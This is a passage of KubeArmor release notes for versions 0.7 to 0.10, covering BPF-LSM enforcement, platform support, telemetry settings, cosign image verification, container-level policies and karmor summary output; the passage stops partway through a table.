In the previous versions, enforcement in containerized workloads was limited to AppArmor. We are delighted to introduce support for BPF-LSM (Linux Security Modules) in non-orchestrated containerized workloads. This new capability allows you to leverage the benefits of BPF-based security policies even outside of orchestrated environments. You can now avail the benefits of BPF LSM for enhanced security and fine-grained control over containerized workloads.

By incorporating BPF LSM enforcement, KubeArmor enables users to define and enforce security policies at the kernel level, providing an additional layer of protection for their containerized environments. Advanced capabilities offered by BPF LSM, including powerful eBPF (extended Berkeley Packet Filter) programs and flexible security rules, are now unlocked!

![image](https://github.com/kubearmor/KubeArmor/assets/9133227/62d45528-bb4d-4ec8-a65e-8d2a3472dc9b)

## Helm Installation Fixes

For smoother deployments using Helm, we have addressed several issues and made necessary fixes. To benefit from these improvements, please refer to our updated [Helm installation guide](https://github.com/kubearmor/KubeArmor/tree/main/deployments/helm). If you are still facing any issues, please put it up in the [discussions](https://github.com/kubearmor/KubeArmor/discussions).

![image](https://github.com/kubearmor/KubeArmor/assets/9133227/5c882a40-d27c-488e-9493-b3e65f6c6cda)

## Auto-Updating Dependencies

To ensure you always have the latest dependencies, KubeArmor now utilizes Renovate, an automated dependency update tool. With Renovate, you can expect a seamless experience, as KubeArmor keeps your dependencies up to date automatically. Everything synced!

![image](https://github.com/kubearmor/KubeArmor/assets/9133227/472eef4a-24eb-4b9a-8078-9de739399449)

## Support for New Platforms

With this release, we have expanded our platform support to include:

1. DigitalOcean [Kubernetes](https://www.digitalocean.com/products/kubernetes)(DOKs)
2. Mirantis MKE.
3. Amazon Linux 2023.

![image](https://github.com/kubearmor/KubeArmor/assets/9133227/779da08a-0de4-4482-83b4-fb9cab16e7b9)

This means you can now confidently run KubeArmor on these platforms, benefiting from enhanced security and protection.

## Default Visibility Changes

In previous versions, KubeArmor enabled full telemetry by default for all workloads. With v0.10, we have made a significant change. By default, telemetry for workloads is now disabled, offering more flexibility in managing telemetry settings. If you want to enable telemetry for specific workloads or namespaces, you can easily do so using [annotations](https://docs.kubearmor.io/kubearmor/documentation/kubearmor_visibility).

## Miscellaneous

We are grateful to our dedicated community for their continuous support and valuable contributions that have made this release possible. Your feedback and suggestions drive us to improve KubeArmor with every release.

To explore the complete list of changes, bug fixes, and enhancements in KubeArmor v0.10, please refer to our [release notes](https://github.com/kubearmor/KubeArmor/releases/tag/v0.10.2).

Upgrade to KubeArmor v0.10 today and experience the latest features and fixes firsthand. We look forward to hearing your thoughts and helping you strengthen the security of your Kubernetes deployments.

Got any questions? Check out the [FAQ](https://docs.kubearmor.io/kubearmor/documentation/faq) page or join the [KubeArmor Slack](https://join.slack.com/t/kubearmor/shared_invite/zt-1ltmqdbc6-rSHw~LM6MesZZasmP2hAcA) for support.

Stay tuned for more updates and exciting features on our roadmap. Together, let's build a more secure and resilient Kubernetes ecosystem!

# v0.9

## New Managed Kubernetes platforms supported

KubeArmor v0.9 added support for new managed kubernetes platforms such as [Oracle Container Engine for Kubernetes (OKE)](https://github.com/kubearmor/KubeArmor/wiki/KubeArmor-support-for-Oracle-Container-Engine-for-Kubernetes-\(OKE\)), [IBM Cloud Kubernetes Service](https://github.com/kubearmor/KubeArmor/issues/1107), and [AWS Amazon Linux 2](https://github.com/kubearmor/KubeArmor/issues/1005).

![KubeArmor Support Matrix](https://user-images.githubusercontent.com/9133227/224011901-55874a44-3a96-43f6-8643-a5b0e616f45e.png)

## Support for ARM based k8s platforms

Support for ARM based cloud platforms such as [AWS Graviton](https://github.com/kubearmor/KubeArmor/issues/1063), and [Oracle Ampere](https://github.com/kubearmor/KubeArmor/issues/1084) are added in v0.9.

![graviton and ampere](https://user-images.githubusercontent.com/9133227/224018007-e9b644b2-7eb1-45eb-a20c-280fcf9f9648.png)

Check out full [KubeArmor support matrix here](https://docs.kubearmor.io/kubearmor/quick-links/support_matrix).

## Performance Improvements

KubeArmor in-kernel event filtering changes were added in v0.9. The intention was to filter the events early in its cycle i.e., in the kernel space itself such that performance penalty of user space context switch is not incurred. Note that KubeArmor uses existing LSM (Linux Security Modules) hooks for policy enforcement. The LSM hooks are already enabled by default in all the Linux kernel images. Overall based on the [benchmarking data](https://github.com/kubearmor/KubeArmor/wiki/KubeArmor-Performance-Benchmarking-Data) taken on the docker sock-shop example, we found that the impact of KubeArmor is <3% on the overall requests per second performance of the sock-shop example.

![kubearmor performance](https://user-images.githubusercontent.com/9133227/224029506-027de93b-4994-457f-9813-6d22e28640c0.png)

## Visibility/Telemetry configuration per namespace

Before v0.9, KubeArmor enabled telemetry across all the namespaces, deployments within the cluster. This caused significant telemetry events generated across non-user workload namespaces (such as kube-system). With v0.9, one can selectively enable process, file, network related telemetry across different namespaces.

![namespace based visibility](https://user-images.githubusercontent.com/9133227/224036523-0cb1aff2-aca1-4aaa-a608-a9c1fd751347.png)

## K8s Operator-based install for KubeArmor

KubeArmor supports multiple modes of deployment today, including using manifests files, helm, and using karmor cli tool.

However, operator-based installation was desired for KubeArmor for the following reasons:

1. To handle the scenario where the cluster contains multiple nodes supporting different LSM (Linux Security Modules). KubeArmor cannot set the AppArmor annotation in context to the workload deployed on the node not supporting AppArmor.
2. There are certain services such as Kubearmor relay whose resource utilization depends on the number of nodes operating within the cluster.

Operator-based installation and subsequent monitoring simplify the handling of such scenarios.

With this release, the karmor cli tool or the helm/manifests will install the operator and then the operator will install the relevant Daemonset and services needed.

![](https://user-images.githubusercontent.com/9133227/224039945-6ea76ca8-c23e-4f72-b0a1-507ae92dc8c4.png)

## Consolidation of controllers

KubeArmor installed different controllers each for `KubearmorPolicy`, `KubearmorHostPolicy` in different pods namely `policy-controller` and `host-policy-controller` respectively. The new release consolidates multiple controllers into a single pod reducing the overall number of kubearmor pods deployed in the cluster and that single pod will reconcile all the kubernetes resources managed by KubeArmor.

## Support for Unbreakable Enterprise Linux (UEK) used in Oracle Kubernetes Engine (OKE)

KubeArmor BPFLSM enforcer is used to support OKE with UEK7 and above. KubeArmor BPFLSM didn't support containerd which was a prerequisite for OKE platform. v0.9 added support for containerd to be used with BPFLSM enforcer, thus making OKE work.

## Support for AWS Amazon Linux 2

AWS Amazon Linux 2 kernel version >=5.8 supported BPFLSM, however, it was found that the bpf filesystem was not mounted by default in the worker nodes. KubeArmor added the logic to check if the bpf filesystem is mounted and if not, mount the bpf filesystem on a custom path within the KubeArmor pod itself.

## Support for IBM Cloud Kubernetes Service

IBM Cloud Kubernetes Service by default using Ubuntu 18.04 and AppArmor was by default supported on that platform. Thus KubeArmor didn't had to make any changes to support IBM Cloud Kubernetes Service.

## ARM Servers: Support for AWS Graviton

[AWS Graviton](https://aws.amazon.com/ec2/graviton/) processors are designed by AWS to deliver the best price performance for the cloud workloads running in Amazon EC2. EKS also supports using EC2 instances running on AWS Graviton. AWS Graviton can use any Linux distributions. KubeArmor was tested on Ubuntu and Amazon Linux 2 distributions on AWS Graviton. KubeArmor now support AWS Graviton platform for application behavior analysis, network-segmentation, and audit based policies.

## ARM Servers: Support for Oracle Ampere

The [Oracle Cloud Infrastructure Ampere Altra A1 compute platform](https://www.oracle.com/in/cloud/compute/arm/) provides deterministic performance, linear scalability, and a secure architecture with the best price-performance in the market. Users can leverage the industry’s first 160-core Arm server at only $0.01 per core hour and flexible virtual machines with 1-80 cores and 1-64 GB of memory per core. KubeArmor now support Oracle Ampere platform for application behavior analysis, network-segmentation, and audit based policies.

## Miscellaneous

* **Full Enforcement on BPF LSM with Path based hooks**. BPF-LSM based enforcement lacked certain enforcement support previously wherein file open related events were handled but a simple inode creation events were not handled. This resulted in certain operations (such as `touch`) to succeed even if the path is marked as blocked.
* **Support for mount/umount system calls**: To achieve CIS compliance 4.1.14 Ensure successful file system mounts are collected we need to audit the mount and umount events happening. Currently we are making use of mount and umount binaries for generating KubeArmor policies. This method will be not effective if the attacker is trying mount or unmount using system calls. KubeArmor now supports the mount/umount syscalls to make sure that issue mentioned is solved.
* **App Behavior fixes**: Bind port data is now showing meaningful data. Removed unnecessary netlink and unix domain sockets handling in the context.
* **Use of k8s `configmap`**: KubeArmor configuration previously was kept as environment variables. The new release ensures that KubeArmor uses k8s native approach of handling configuration and the changes to the configuration can now be handled dynamically i.e., without restarting the KubeArmor.

# v0.8

## KubeArmor passes AWS Foundational Technical Review (FTR)

The [Amazon Foundational Technical Review (FTR)](https://aws.amazon.com/partners/foundational-technical-review/) is a framework that enables AWS Partners to detect and remediate issues in solutions and products. It focuses on quality, reliability, and safety and outlines the best practices to meet the set requirements.

KubeArmor applied for an AWS Foundational Technical Review and fulfilled all the set criteria. Changes had to be done in KubeArmor to fulfill the requirements, especially towards the security side of elements. FTR requires that the containers do not use privileged mode. KubeArmor had to be updated to fulfill this requirement.

One of the outcomes of this review was that KubeArmor is now [listed](https://partners.amazonaws.com/search/solutions/?keyword=kubearmor) as an official AWS Partner Solution.

## Profiling KubeArmor logs using karmor

KubeArmor's CLI just received a new feature! `karmor profile` which in real-time shows a terminal user interface table of three different operations going on in KubeArmor: Process, File and Network. It maintains a counter of each operation that is happening within the cluster, along with other useful details. It directly fetches data from the `karmor logs` API and displays all the required information. The TUI includes simple navigation between operations and a user input based filter as well.

![karmor profile](https://raw.githubusercontent.com/Ankurk99/docs-res/main/gif/Filter.gif)

## KubeArmor Image Signing using CoSign

Container Image provenance requires signing an image that provides cryptographic evidence indicating that the author is who they say they are. Software Supply Chain attacks are becoming increasingly common and the onus is on the developers and maintainers to ensure that the workload images are signed. The users of the images have the responsibility to verify the provenance of these images before deploying. Devs, maintainers, and users have to depend on a trusted entity for image provenance. One such framework is provided by the [sigstore community](https://www.sigstore.dev/). Sigstore provides primitives to sign the images/blobs, ensure certificate transparency, and subsequently provides tools that can be used to verify the images and get the activities records.

This release of KubeArmor introduces a way for KubeArmor to sign the images it pushes to the docker registry using `sigstore/cosign` such that any external user can verify the authenticity of the image and check the associated transparency logs using `sigstore/rekor`.

## How does KubeArmor use sigstore primitives?

An image signed using KubeArmor pipelines indicates that the image was indeed produced by the appropriate KubeArmor ecosystem.

![cosign](https://user-images.githubusercontent.com/9133227/210810246-5085313e-aeea-4c07-8b81-baf0f79be07f.png)

## As a user, how can I verify whether the image is signed by the trusted entity?

One can use `cosign verify` to check whether the image is signed.

```
❯ COSIGN_EXPERIMENTAL=1 cosign verify kubearmor/kubearmor@sha256:3a1f3bf3bce191833176e7681b49ae4ae24edad19fa84941dcdda4382a3a44ee | jq

Verification for index.docker.io/kubearmor/kubearmor@sha256:3a1f3bf3bce191833176e7681b49ae4ae24edad19fa84941dcdda4382a3a44ee --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - The existence of the claims in the transparency log was verified offline
  - Any certificates were verified against the Fulcio roots.
[
  {
    "critical": {
      "identity": {
        "docker-reference": "index.docker.io/kubearmor/kubearmor"
      },
      "image": {
        "docker-manifest-digest": "sha256:3a1f3bf3bce191833176e7681b49ae4ae24edad19fa84941dcdda4382a3a44ee"
      },
      "type": "cosign container image signature"
    },
    "optional": {
      "1.3.6.1.4.1.57264.1.1": "https://token.actions.githubusercontent.com",
      "1.3.6.1.4.1.57264.1.2": "push",
      "1.3.6.1.4.1.57264.1.3": "445ee44df72f09f5b539cfdb7cac5b3d5e014e6a",
      "1.3.6.1.4.1.57264.1.4": "ci-latest-release",
      "1.3.6.1.4.1.57264.1.5": "kubearmor/KubeArmor",
      "1.3.6.1.4.1.57264.1.6": "refs/heads/main",
      "Bundle": {
        "SignedEntryTimestamp": "MEUCIQDxQ546JPKpzYj34zmTnaDNEKq2iKpE9eNyO+uh32YSdgIgOAIkgjQ5A7XS24bKZNp/f1RT/TzcZLfrzsHRnruqtbI=",
        "Payload": {
          "body": "eyJhcGlWZXJzaW9uIjoiMC4wLjEiLCJraW5kIjoiaGFzaGVkcmVrb3JkIiwic3BlYyI6eyJkYXRhIjp7Imhhc2giOnsiYWxnb3JpdGhtIjoic2hhMjU2IiwidmFsdWUiOiI2MWYxNjZkYzkzMjNkZTYxZjY1MDVhZTVlNmQ1MDk5ZWI4YjEwZWNiYWExZDhlM2Q2NzdkOTAyMTUzNTlkZWIzIn19LCJzaWduYXR1cmUiOnsiY29udGVudCI6Ik1FVUNJQ2JZNm41ZSsrbzlWOTczS3BFd0lMcXRIQkpkTXRBZHFja2U3SkdXdHM4ZUFpRUF1K05TSVExL2tiR0VSMGVVY3NqR1VqMmdsamwyQmFXSWxUMWt6QnZBQjZRPSIsInB1YmxpY0tleSI6eyJjb250ZW50IjoiTFMwdExTMUNSVWRKVGlCRFJWSlVTVVpKUTBGVVJTMHRMUzB0Q2sxSlNVUnhWRU5EUVhrclowRjNTVUpCWjBsVldtVXZlVzVKZWtwc00ySlhkakJuZWtsaFFrRXlXblpZVmtORmQwTm5XVWxMYjFwSmVtb3dSVUYzVFhjS1RucEZWazFDVFVkQk1WVkZRMmhOVFdNeWJHNWpNMUoyWTIxVmRWcEhWakpOVWpSM1NFRlpSRlpSVVVSRmVGWjZZVmRrZW1SSE9YbGFVekZ3WW01U2JBcGpiVEZzV2tkc2FHUkhWWGRJYUdOT1RXcE5kMDFVUVhsTlJGRXdUMVJGZUZkb1kwNU5hazEzVFZSQmVVMUVVVEZQVkVWNFYycEJRVTFHYTNkRmQxbElDa3R2V2tsNmFqQkRRVkZaU1V0dldrbDZhakJFUVZGalJGRm5RVVZxYVRKMWFrVlZSVEpXT0hwbmVHVTBZMFZQVDI1UFFuTldXSGhyY0ZKalpUQlpkMFlLVm5wT01rUnBiWEpXUm1ST1ZFMHlhR1EyWVhjNGRtdElkamhvT1doU1IzQkVOelE0VkRKQmNGWjZhMlZ5YVdsUWNFdFBRMEZyTkhkblowcExUVUUwUndwQk1WVmtSSGRGUWk5M1VVVkJkMGxJWjBSQlZFSm5UbFpJVTFWRlJFUkJTMEpuWjNKQ1owVkdRbEZqUkVGNlFXUkNaMDVXU0ZFMFJVWm5VVlZzY2paUUNqQTFjRUZhVTBReE0xZEpibEZ4WlhSb1VVNVZWMEYzZDBoM1dVUldVakJxUWtKbmQwWnZRVlV6T1ZCd2VqRlphMFZhWWpWeFRtcHdTMFpYYVhocE5Ga0tXa1E0ZDJKQldVUldVakJTUVZGSUwwSkhTWGRaU1ZwbFlVaFNNR05JVFRaTWVUbHVZVmhTYjJSWFNYVlpNamwwVERKME1WbHRWbWhqYlRGMlkyazVUQXBrVjBwc1VWaEtkR0l6U1haTWJXUndaRWRvTVZscE9UTmlNMHB5V20xNGRtUXpUWFpaTW10MFlrZEdNRnBZVGpCTVdFcHNZa2RXYUdNeVZYVmxWekZ6Q2xGSVNteGFiazEyWVVkV2FGcElUWFppVjBad1ltcEJOVUpuYjNKQ1owVkZRVmxQTDAxQlJVSkNRM1J2WkVoU2QyTjZiM1pNTTFKMllUSldkVXh0Um1vS1pFZHNkbUp1VFhWYU1td3dZVWhXYVdSWVRteGpiVTUyWW01U2JHSnVVWFZaTWpsMFRVSkpSME5wYzBkQlVWRkNaemM0ZDBGUlNVVkNTRUl4WXpKbmR3cE9aMWxMUzNkWlFrSkJSMFIyZWtGQ1FYZFJiMDVFVVRGYVYxVXdUa2RTYlU1NlNtMU5SR3h0VGxkSk1VMTZiR3BhYlZKcFRqSk9hRmw2Vm1sTk1sRXhDbHBVUVhoT1IxVXlXVlJCWmtKbmIzSkNaMFZGUVZsUEwwMUJSVVZDUWtacVlWTXhjMWxZVW14ak0xRjBZMjFXYzFwWFJucGFWRUZvUW1kdmNrSm5SVVVLUVZsUEwwMUJSVVpDUWs1eVpGZEtiRmxZU25SaU0wbDJVek5XYVZwVlJubGlWemw1VFVJd1IwTnBjMGRCVVZGQ1p6YzRkMEZSV1VWRU0wcHNXbTVOZGdwaFIxWm9Xa2hOZG1KWFJuQmlha05DYVdkWlMwdDNXVUpDUVVoWFpWRkpSVUZuVWpoQ1NHOUJaVUZDTWtGT01EbE5SM0pIZUhoRmVWbDRhMlZJU214dUNrNTNTMmxUYkRZME0ycDVkQzgwWlV0amIwRjJTMlUyVDBGQlFVSm9XRVJRTlhNNFFVRkJVVVJCUldOM1VsRkpaMVZDVFdscWMwb3JNbVJPVWxCVU9FVUtlRFYyVEZBNWFtNVVlREZKTW5aaFQycGxaelZOYUhBd2NFaDNRMGxSUkc1TldFdFdlbVZUWXpSakwycElTRGhyVWtwSFpHYzNabEZzVjFCM1JHWm1jd3BuZGxGdmFEQk5ZaTlxUVV0Q1oyZHhhR3RxVDFCUlVVUkJkMDV2UVVSQ2JFRnFSVUV4WlRoaWFVRnFiRkJDZFRjM2FrVXJaM1p3VWtSQmJGcHVTbVZ4Q21FNE5VOHpjWHBvVHpZdk4yTkdkVWhYT0ZSR1dsRnlMMk4yUjBOMVZXWlJPRXhCVlVGcVFVRnhXVEU1YkZJMWF6VkJXWE4zUVhaT2RUaFNSMG92Ym1jS1RHdHNZM3BaU0V4aFpGWTVURmhPUW5vMlZEQmFhM0ZpTWxWdVdHOHJia3QzVUM5TE1qSlpQUW90TFMwdExVVk9SQ0JEUlZKVVNVWkpRMEZVUlMwdExTMHRDZz09In19fX0=",
          "integratedTime": 1672634952,
          "logIndex": 10298691,
          "logID": "c0d23d6ad406973f9559f3ba2d1ca01f84147d8ffc5b8445c224f98b9591801d"
        }
      },
      "Issuer": "https://token.actions.githubusercontent.com",
      "Subject": "https://github.com/kubearmor/KubeArmor/.github/workflows/ci-latest-release.yml@refs/heads/main",
      "githubWorkflowName": "ci-latest-release",
      "githubWorkflowRef": "refs/heads/main",
      "githubWorkflowRepository": "kubearmor/KubeArmor",
      "githubWorkflowSha": "445ee44df72f09f5b539cfdb7cac5b3d5e014e6a",
      "githubWorkflowTrigger": "push"
    }
  }
]
```

As a user, one can check the transparency records from Rekor logs. Example Rekor logs for KubeArmor can be seen [here](https://rekor.tlog.dev/?logIndex=10327335).

## Get visibility into the use of server ports

`karmor summary` of bind/syscalls

```
Ingress connections
+----------+------------------+-------------------------------+------+-----------+----------------------------+-------+------------------------------+
| PROTOCOL |     COMMAND      |          POD/SVC/IP           | PORT | NAMESPACE |           LABELS           | COUNT |      LAST UPDATED TIME       |
+----------+------------------+-------------------------------+------+-----------+----------------------------+-------+------------------------------+
| TCPv6    | /usr/sbin/mysqld | pod/dvwa-web-59b677c755-xdbsq | 3306 | dvwa      | app=dvwa-web,tier=frontend | 20    | Mon Jan  2 13:52:55 UTC 2023 |
+----------+------------------+-------------------------------+------+-----------+----------------------------+-------+------------------------------+


Egress connections
+----------+---------------------+-----------------------------+------+-----------+--------+-------+------------------------------+
| PROTOCOL |       COMMAND       |         POD/SVC/IP          | PORT | NAMESPACE | LABELS | COUNT |      LAST UPDATED TIME       |
+----------+---------------------+-----------------------------+------+-----------+--------+-------+------------------------------+
| AF_UNIX  | /usr/bin/mysql      | /var/run/mysqld/mysqld.sock | 0    |           |        | 2     | Fri Dec 23 04:49:32 UTC 2022 |
| AF_UNIX  | /usr/bin/mysqladmin | /var/run/mysqld/mysqld.sock | 0    |           |        | 1     | Fri Dec 23 04:49:32 UTC 2022 |
+----------+---------------------+-----------------------------+------+-----------+--------+-------+------------------------------+


Bind Points
+------------+------------------+-----------+--------------+-------+------------------------------+
|  PROTOCOL  |     COMMAND      | BIND PORT | BIND ADDRESS | COUNT |      LAST UPDATED TIME       |
+------------+------------------+-----------+--------------+-------+------------------------------+
| AF_NETLINK | /usr/sbin/mysqld |           |              | 1     | Fri Dec 23 04:49:36 UTC 2022 |
| AF_INET6   | /usr/sbin/mysqld | 3306      | ::           | 1     | Fri Dec 23 04:49:36 UTC 2022 |
+------------+------------------+-----------+--------------+-------+------------------------------+
```

\##Learnings For this release, we tried to use kernel audit for observing policy violations. We faced some issues with it and thus have to revert the changes. Here is a summary of what was expected, what happened, and the learnings from this interesting experiment.

## The expectations

### Kernel Audit for fetching policy violations

KubeArmor uses eBPF for two purposes:

1. Get visibility/observability events into the workloads.
2. To get alerts in the context of the policies

The operations involved in point 1 are straightforward i.e, KubeArmor gets an event, matches/annotate the events with the process, container, pod, and namespace information, and sends the event out to the clients waiting on the stream. The operations involved in point 2 are tricky. When KubeArmor gets an event, it needs to check whether the event parameters match any of the policy specifications/rules, and if it does, generate an alert accordingly. The challenge is that the matching operation is a non-trivial operation. Assume that the user has set the policy to block execution of `/usr/bin/sleep` binary. Now when the event is generated, the `kretprobe` of the `sys_execve` syscall is going to return "Permission Denied" since the LSM will block the event. Currently, KubeArmor matches the binary name and other contextual information with the policy rules that it has internally stored and checks whether the event was triggered due to a policy violation. This matching operation is non-trivial. Note that the access could be permission denied for reasons outside the scope of KubeArmor i.e, due to capability LSM or due to other access control settings. Thus it should not be inferred that a "Permission Denied" event will always be triggered due to KubeArmor-enforced policy rules only.

### Performance implications

We also expected it to have a drastic (positive) impact on KubeArmor performance since there is no policy-matching code involved in every system call hook.

## What was changed?

Traditional LSMs such as AppArmor, and SELinux, use the Kernel Audit mechanism to send the policy violation events. [Kernel Audit is supported](https://github.com/nyrahul/linux-kernel-configs#kernel-audit-support) across most of the kernels. Note that this change does not depend on userspace components such as [auditd](https://man.archlinux.org/man/auditd.8).

![kernel-audit](https://user-images.githubusercontent.com/9133227/210235510-09d054e1-0a0b-45c3-abba-fdeb47c1ad02.png)

## Issues

* First, we didn't see any noticeable change in the overall performance of KubeArmor, which we measured by looking at the number of alerts being dropped/lost.
* Second and more important, we came up with an issue in AppArmor (or a feature if you want to call it). For Allow-based policies (default posture being Audit), we were getting alerts even in the case of resources that were allowed in the policy. For eg: We cannot create a profile that says, allow access to /root and audit every other access. AppArmor doesn't support this kind of action.

## Learnings and future plan

With the above experiment we realized that kernel-audit is not suitable for all our needs and eBPF mode of observability has the future. We plan on to improve the current performance issues with the eBPF mode of policy violation alerts.

# v0.7

## KubeArmor Release Notes v0.7

#### ARM support for KubeArmor

![ARM KubeArmor support](https://user-images.githubusercontent.com/9133227/201508738-31ba6324-9d01-4425-8f02-c6f9c16c30dd.png)

KubeArmor is increasingly deployed in [near-edge and far-edge scenarios](https://tech.ginkos.in/2019/06/far-edge-vs-near-edge-in-edge-computing.html) for enhanching security for IoT/Edge aspects. KubeArmor has added support to handle the characteristics of edge scenarios such as:

1. Support for heterogenous platforms (most of the edge is deployed on ARM, Intel). KubeArmor ensures that the same policy enforcement techniques are delivered across different linux kernel versions. It does this by abstracting the policy layer from the enforcement layer and the enforcement layer uses the techniques that are available in the context of the deployed worker node.
2. Edge devices are constrained in terms of CPU and memory availability. The overall resource usage on KubeArmor has been drastically reduced. This has not only helped edge scenarios but cloud based deployments as well.
3. KubeArmor supports the philosophy of "Do not assume always-on connectivity with the cloud platform".

Recently KubeArmor finished its [integration with LF Edge Open Horizon](https://open-horizon.github.io/docs/kubearmor-integration/docs/). KubeArmor is also now listed on [Intel SmartEdge Marketplace](https://networkbuilders.intel.com/commercial-applications/accuknox). LF Edge Open Horizon and Intel® Smart Edge are edge computing platforms for deploying edge networks and delivering multi-access edge computing (MEC) for applications, containers, k8s, and virtual machines.

#### Which ARM platforms were tested?

1. Raspberry Pi (RPi) - Both as a systemd service and on k8s
2. Azure ARM VM
3. Apple Macbook M1 laptops

### Network Policy & Microsegmentation support using KubeArmor

In Kubernetes, the [network policy resource](https://kubernetes.io/docs/concepts/services-networking/network-policies/) is a set of network traffic rules that are applied to a group of pods in a Kubernetes cluster. The network policy specifies how a pod is allowed to communicate with others. Network policy controllers (running as pods in the Kubernetes cluster) convert the requirements and restrictions of the network policies that are retrieved from the Kubernetes API into the network infrastructure.

KubeArmor has visibility into the network connections made into or from the pods. It has visibility across `socket()`, `bind()`, `connect()`, `accept()` calls. KubeArmor along with the [discovery-engine](https://github.com/kubearmor/discovery-engine/) could now auto-generate [kubernetes network policy](https://kubernetes.io/docs/concepts/services-networking/network-policies/) which are enforceable using most of the k8s CNIs (Container Network Interface). Note that the discovered policies use k8s abstractions for identifying services, deployments, and pods such as k8s labels, namespaces.

This release allows kubearmor and discovery-engine to do automatic network microsegmentation by detecting the network connections and creating appropriate network policies based on it. These auto-generated network policies are enforceable using any CNI that supports k8s network policy namely, Cilium, Calico, AWS VPC CNI, Weave.

![K8s network policy rule support using kubearmor](https://user-images.githubusercontent.com/9133227/201518064-f52b897e-3c60-4440-88ba-bc3cd1c0f147.png)

### Container based policy support

KubeArmor currently applies policy at the pod level i.e. in the `KubeArmorPolicy` you specify the selector labels which selects a set of pods across the cluster. However, a single pod may contain multiple containers and each container usually has a very different purpose and the set of binaries or file paths may vary across multiple containers within the pod.

This release adds support to apply the policies at specific container level by extending the selector label policy construct. Following is an instantiation of this construct:

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-ls-at-container-1
  namespace: wordpress-mysql
spec:
  severity: 2
  selector:
    matchLabels:
      app: wordpress
      kubearmor.io/container.name: "[container-1]"
  process:
    matchPaths:
    - path: /bin/ls
  action:
    Block
```

Note the use of `kubearmor.io/container.name: "[container-1]"` construct as part of the selector labels that allows KubeArmor to select specific container(s) within the pod.

![Container specific policies](https://user-images.githubusercontent.com/9133227/201514997-c73c59c7-af47-45b5-9e62-a00f7b2ea704.png)

#### Need for this support

The file system paths and binaries present in different containers might be completely different. Without this feature, the block of a process operation in one container would also be blocked in other containers. The [discovery-engine](https://github.com/kubearmor/discovery-engine) automatically discovers the security posture of the k8s application discovers what operations should be allowed. These operations are container specific and should be restricted to specific containers. Thus without the ability to specify container specific rules, there are chances that either the security posture is too generic (in the case of allow based policies) or too restrictive (in the case of block based policies).

#### Backward compatibility

Specifying container specific labels are optional i.e., if the container information is not specified then the previous way of applying the policies at pod level is retained.

## Using un-privileged container for KubeArmor daemonset (as a part of LFX Mentorship)

KubeArmor is a security policy engine and it needs to be ensured that the engine itself follows all the right security practices. Privileged containers are usually frowned upon. Almost every static scanning engine will flag this as an issue. In lot of cases, organizations deploy admission controllers that would not allow containers to be installed in privileged mode.

This release achieves following in the context:

1. Removes the use of `privilege: true` flag in the context of kubearmor and associated accessory pods.
2. Enables individual capabilities in place of enabling all capabilities for the KubeArmor containers.
3. Allows KubeArmor to be installed in non-kube-system namespace.

Kudos to [Anurag Kumar](https://github.com/kranurag7) who achieved this as part [LFX Mentorship Project](https://mentorship.lfx.linuxfoundation.org/project/3cc962b4-cd8b-46ea-9c77-83304145fd51).

### Workload behavior summary with KubeArmor and Discovery Engine

KubeArmor can observe system events at different dimensions including, Process, File, and Network events. Discovery Engine connects to KubeArmor and does aggregation of this information over a time period to provide app behavior summary. The use-cases for this summary view are:

1. User can view what are the different process getting spawned in the given workload. Workload could be filtered based on namespace, labels etc.
2. User can view what file system paths are accessed. For e.g., user can check which processes within the workload are accessing service account token.
3. User can check what network connections are handled by the workload. Note that the ingress/egress connections are pinned down to the final process which handles it.

![karmor-summary](https://user-images.githubusercontent.com/9133227/201572596-0de140c6-7ea2-468c-b182-9387c037bae3.gif)

```
❯ karmor summary -n wordpress-mysql -l app=wordpress --agg
local port to be used for port forwarding knoxautopolicy-8587dfd464-28dpq: 9089

  Pod Name        wordpress-bf95888cb-rkcwm
  Namespace Name  wordpress-mysql
  Cluster Name    default
  Container Name  wordpress
  Labels          app=wordpress

Process Data
+------------------------------------------------------------------------------------------------------------------------+-----------------------------------+-------+------------------------------+--------+
|                                                      SRC PROCESS                                                       |     DESTINATION PROCESS PATH      | COUNT |      LAST UPDATED TIME       | STATUS |
+------------------------------------------------------------------------------------------------------------------------+-----------------------------------+-------+------------------------------+--------+
| /bin/bash                                                                                                              | /bin/mkdir                        | 1     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /bin/bash                                                                                                              | /bin/sed                          | 19    | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /bin/bash                                                                                                              | /usr/bin/cut                      | 3     | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /bin/bash                                                                                                              | /usr/bin/dirname                  | 4     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /bin/bash                                                                                                              | /usr/bin/head                     | 3     | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /bin/bash                                                                                                              | /usr/bin/sha1sum                  | 3     | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /bin/bash                                                                                                              | /usr/local/bin/php                | 5     | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /var/lib/rancher/k3s/data/8307e9b398a0ee686ec38e18339d1464f75158a8b948b059b564246f4af3a0a6/bin/containerd-shim-runc-v2 | /usr/local/bin/apache2-foreground | 1     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /var/lib/rancher/k3s/data/8307e9b398a0ee686ec38e18339d1464f75158a8b948b059b564246f4af3a0a6/bin/containerd-shim-runc-v2 | /usr/sbin/apache2                 | 1     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
+------------------------------------------------------------------------------------------------------------------------+-----------------------------------+-------+------------------------------+--------+


File Data
+-----------------------------------+--------------------------------------------------------------------+-------+------------------------------+--------+
|            SRC PROCESS            |                       DESTINATION FILE PATH                        | COUNT |      LAST UPDATED TIME       | STATUS |
+-----------------------------------+--------------------------------------------------------------------+-------+------------------------------+--------+
| /bin/mkdir                        | /etc/                                                              | 1     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /bin/mkdir                        | /lib/x86_64-linux-gnu/                                             | 4     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /bin/rm                           | /lib/x86_64-linux-gnu/                                             | 1     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
| /bin/sed                          | /etc/                                                              | 10    | Mon Nov 14 03:49:36 UTC 2022 | Allow  |
| /bin/sed                          | /lib/x86_64-linux-gnu/                                             | 25    | Mon Nov 14 03:49:35 UTC 2022 | Allow  |
| /usr/bin/dirname                  | /etc/                                                              | 2     | Mon Nov 14 03:49:44 UTC 2022 | Allow  |
